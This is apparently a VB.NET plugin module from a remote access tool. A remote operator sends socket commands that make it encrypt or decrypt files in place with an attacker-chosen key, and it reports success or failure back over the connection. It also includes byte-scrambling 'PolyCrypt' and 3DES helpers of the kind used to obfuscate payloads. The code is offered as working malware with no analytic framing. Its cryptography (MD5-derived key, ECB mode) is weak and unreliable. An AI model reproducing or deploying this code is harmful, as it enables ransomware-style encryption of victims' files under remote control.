
Imports System.Net.Sockets
Imports System.Security.Cryptography
Imports System.Text
Public Class MainCL


    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")


        If h(1) = "|AESENC|" Then

            Await Task.Run(Sub() Crypto.LAUNCH(Crypto.Algo_Op.AES_ENC, h(2), h(3), k))


        ElseIf h(1) = "|AESDEC|" Then


            Await Task.Run(Sub() Crypto.LAUNCH(Crypto.Algo_Op.AES_DEC, h(2), h(3), k))

        End If

    End Sub






End Class
Public Class Crypto
    ' Methods



    Public Enum Algo_Op

        AES_DEC = 0
        AES_ENC = 1
    End Enum

    Private Shared DONE As String = "|DONE|CRYPTO|"
    Private Shared FAIL As String = "|FAIL|CRYPTO|"

    Public Shared Sub LAUNCH(ByVal l As Algo_Op, ByVal P As String, ByVal KE As String, ByVal K As TcpClient)
        If l = Algo_Op.AES_ENC Then

            Try
                Dim R As Byte() = AES_Encrypt(IO.File.ReadAllBytes(P), KE)
                IO.File.WriteAllBytes(P, R)


                Dim D As String = P & DONE

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))


            Catch ex As Exception



                Dim D As String = P & FAIL

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))

            End Try



        ElseIf l = Algo_Op.AES_DEC Then


            Try
                Dim R As Byte() = AES_Decrypt(IO.File.ReadAllBytes(P), KE)
                IO.File.WriteAllBytes(P, R)


                Dim D As String = P & DONE

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))


            Catch ex As Exception



                Dim D As String = P & FAIL

                Dim B As Byte() = Encoding.Default.GetBytes(D)
                Task.Run(Sub() K.GetStream.WriteAsync(B, 0, B.Length))

            End Try



        End If
    End Sub

    Public Shared Function AES_Decrypt(ByVal input As Byte(), ByVal pass As String) As Byte()
        Dim buffer As Byte()
        Dim managed As New RijndaelManaged
        Dim provider As New MD5CryptoServiceProvider
        Try
            Dim destinationArray As Byte() = New Byte(&H20 - 1) {}
            Dim sourceArray As Byte() = provider.ComputeHash(Encoding.UTF8.GetBytes(pass))
            Array.Copy(sourceArray, 0, destinationArray, 0, &H10)
            Array.Copy(sourceArray, 0, destinationArray, 15, &H10)
            managed.Key = destinationArray
            managed.Mode = CipherMode.ECB
            buffer = managed.CreateDecryptor.TransformFinalBlock(input, 0, input.Length)
        Catch exception1 As Exception

        End Try
        Return buffer
    End Function

    Public Shared Function AES_Encrypt(ByVal input As Byte(), ByVal pass As String) As Byte()
        Dim buffer As Byte()
        Dim managed As New RijndaelManaged
        Dim provider As New MD5CryptoServiceProvider
        Try
            Dim destinationArray As Byte() = New Byte(&H20 - 1) {}
            Dim sourceArray As Byte() = provider.ComputeHash(Encoding.UTF8.GetBytes(pass))
            Array.Copy(sourceArray, 0, destinationArray, 0, &H10)
            Array.Copy(sourceArray, 0, destinationArray, 15, &H10)
            managed.Key = destinationArray
            managed.Mode = CipherMode.ECB
            buffer = managed.CreateEncryptor.TransformFinalBlock(input, 0, input.Length)
        Catch exception1 As Exception

        End Try
        Return buffer
    End Function

    Public Shared Function PolyCrypt(ByRef Data As Byte(), ByVal Key As Byte(), ByVal Optional ExtraRounds As UInt32 = 0) As Byte()
        Array.Resize(Of Byte)(Data, (Data.Length + 1))
        Data((Data.Length - 1)) = Convert.ToByte(New Random().Next(1, &HFF))
        Dim i As Long = ((Data.Length - 1) * (ExtraRounds + 1))
        Do While (i >= 0)
            Data(CInt((i Mod CLng(Data.Length)))) = CByte((CByte(((Data(CInt((i Mod CLng(Data.Length)))) + Data(CInt(((i + 1) Mod CLng(Data.Length))))) Mod &H100)) Xor Key(CInt((i Mod CLng(Key.Length))))))
            i = (i + -1)
        Loop
        Dim buffer As Byte() = Data
        Return buffer
    End Function

    Public Shared Function PolyDeCrypt(ByRef Data As Byte(), ByVal Key As Byte(), ByVal Optional ExtraRounds As UInt32 = 0) As Byte()
        Dim num As Long = ((Data.Length - 1) * (ExtraRounds + 1))
        Dim i As Long = 0
        Do While (i <= num)
            Data(CInt((i Mod CLng(Data.Length)))) = CByte(((((Data(CInt((i Mod CLng(Data.Length)))) Xor Key(CInt((i Mod CLng(Key.Length))))) - Data(CInt(((i + 1) Mod CLng(Data.Length))))) + &H100) Mod &H100))
            i = (i + 1)
        Loop
        Array.Resize(Of Byte)(Data, (Data.Length - 1))
        Dim buffer As Byte() = Data
        Return buffer
    End Function

    Public Shared Function T3DESDecrypt(ByVal bytData As Byte(), ByVal sKey As String, ByVal Optional tMode As CipherMode = 2, ByVal Optional tPadding As PaddingMode = 2) As Byte()
        Dim provider As New MD5CryptoServiceProvider
        provider.Clear()
        Dim provider2 As New TripleDESCryptoServiceProvider With {
            .Key = provider.ComputeHash(Encoding.UTF8.GetBytes(sKey)),
            .Mode = tMode,
            .Padding = tPadding
        }
        Dim buffer3 As Byte() = provider2.CreateDecryptor.TransformFinalBlock(bytData, 0, bytData.Length)
        provider2.Clear()
        Return buffer3
    End Function

    Public Shared Function T3DESEncrypt(ByVal bytData As Byte(), ByVal sKey As String, ByVal Optional tMode As CipherMode = 2, ByVal Optional tPadding As PaddingMode = 2) As Byte()
        Dim provider As New MD5CryptoServiceProvider
        provider.Clear()
        Dim provider2 As New TripleDESCryptoServiceProvider With {
            .Key = provider.ComputeHash(Encoding.UTF8.GetBytes(sKey)),
            .Mode = tMode,
            .Padding = tPadding
        }
        Dim buffer3 As Byte() = provider2.CreateEncryptor.TransformFinalBlock(bytData, 0, bytData.Length)
        provider2.Clear()
        Return buffer3
    End Function

End Class



